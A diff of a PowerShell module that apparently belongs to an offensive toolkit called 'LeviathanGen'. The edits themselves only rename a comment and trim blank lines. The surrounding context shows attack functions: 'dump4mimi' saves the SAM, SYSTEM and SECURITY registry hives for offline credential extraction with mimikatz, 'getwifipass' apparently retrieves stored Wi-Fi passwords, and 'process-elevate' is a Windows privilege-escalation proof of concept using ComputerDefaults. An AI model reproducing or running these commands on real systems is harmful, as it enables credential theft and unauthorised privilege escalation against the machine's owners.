@@ -1,4 +1,4 @@
-# new-functions for support LeviathanGen
+# new-functions for support LGen
 function geolocation  {
     $url = "http://ip-api.com/json/$IPAddress"
     Invoke-RestMethod -Method Get -Uri $url
@@ -80,8 +80,6 @@ function getwifipass {
 }
 Export-ModuleMember -Function getwifipass
 Set-Alias -Name getwifipass -Value getwifipass
-
-
 
 function dump4mimi {
     $cmdCommand = "reg save HKLM\sam $env:userprofile\sam && reg save HKLM\system $env:userprofile\system && reg save HKLM\SECURITY $env:userprofile\security && exit"
@@ -232,7 +230,6 @@ clear
 Export-ModuleMember -Function xtmpclean
 Set-Alias -Name xtmpclean -Value xtmpclean
 
-
 #POC for Windows
 function process-elevate {
     param(
@@ -244,7 +241,3 @@ ComputerDefaults -PID '$IDPORT' -File '$Request'
 }
 Export-ModuleMember -Function process-elevate
 Set-Alias -Name process-elevate -Value process-elevate
-
-
-
-
